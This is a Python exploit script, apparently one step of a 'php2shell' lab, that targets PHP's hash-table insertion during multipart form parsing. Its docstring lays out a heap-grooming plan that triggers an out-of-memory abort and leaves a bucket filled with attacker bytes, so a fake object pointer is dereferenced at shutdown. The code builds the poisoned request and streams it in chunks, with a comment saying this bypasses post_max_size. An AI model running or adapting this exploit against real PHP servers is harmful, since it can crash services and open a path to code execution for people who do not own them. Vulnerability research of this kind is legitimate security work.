#!/usr/bin/env python3
"""php2shell lab, oom5: forge the malformed bucket.

Mechanism (php-src 8.2.34, zend_hash.c:887-890):
    add_to_hash:
        idx = ht->nNumUsed++;            # count committed
        p = ht->arData + idx;            # slot = garbage
        p->key = key = zend_string_init(str, len, ...);   # ALLOC — OOM here aborts

If the fatal fires in zend_string_init, arData[idx] stays garbage and teardown
dtors it. We poison that garbage by ensuring arData resizes land on freed
attacker-controlled value blocks (Zend MM large free-list reclaim), filled with
0x08 bytes -> fake zval type IS_OBJECT -> shutdown derefs 0x0808080808080808.

Phase A: ~790 parts  a[b_i] = <FILL_KB KB of 0x08>  -> fill near limit
Phase B: 200 iterations:
    - a[b0] = <FILL_KB KB fresh>   (frees previous 128KB block: reclaim bait)
    - a[j<i>] = tiny value, KEY = LONGKEY_KB KB of 0x08   (table still growing)
The limit is crossed by a long-key alloc -> malformed bucket with our bytes.
"""

import socket
import sys
import time

HOST = "127.0.0.1"
BOUNDARY = "b" + "X" * 20

FILL_KB = 150          # phase A / b0 churn value size (KB); tune down on value-miss
FILL_PARTS = 790       # phase A part count
LONGKEY_KB = 7         # phase B key size (KB)
B_PARTS = 200          # phase B iterations
POISON = b"\x08"


def part(name: str, value: bytes) -> bytes:
    head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
    ).encode()
    return head + value + b"\r\n"


def build(fill_kb: int) -> bytes:
    fill = POISON * (fill_kb * 1024)
    longkey = POISON * (LONGKEY_KB * 1024)
    out = []
    # Phase A: distinct keys b_0.., big poisoned values
    for i in range(FILL_PARTS):
        out.append(part(f"a[b{i}]", fill))
    # Phase B: churn b0 (reclaim bait) + long-key inserts (table keeps growing)
    for i in range(B_PARTS):
        out.append(part("a[b0]", fill))
        out.append(part(f"j{i}", longkey))
    out.append(f"--{BOUNDARY}--\r\n".encode())
    return b"".join(out)


def fire(port: int) -> tuple[bool, str]:
    body = build(FILL_KB)
    s = socket.create_connection((HOST, port), timeout=240)
    s.sendall(
        (
            f"POST /index.php HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
        ).encode()
    )
    # stream in 64KB chunks so post_max_size stays bypassed
    for i in range(0, len(body), 65536):
        c = body[i:i + 65536]
        s.sendall(f"{len(c):x}\r\n".encode() + c + b"\r\n")
    s.sendall(b"0\r\n\r\n")
    resp = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        resp += d
    s.close()
    text = resp.decode("utf-8", "replace")
    return ("Fatal error" in text), text


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    t0 = time.time()
    fatal, text = fire(port)
    dt = time.time() - t0
    print(f"[oom5] port={port} fatal={fatal} ({dt:.1f}s) body={len(text)}B")
    for line in text.splitlines():
        if "Fatal" in line or "Warning" in line:
            print("   ", line.strip()[:220])
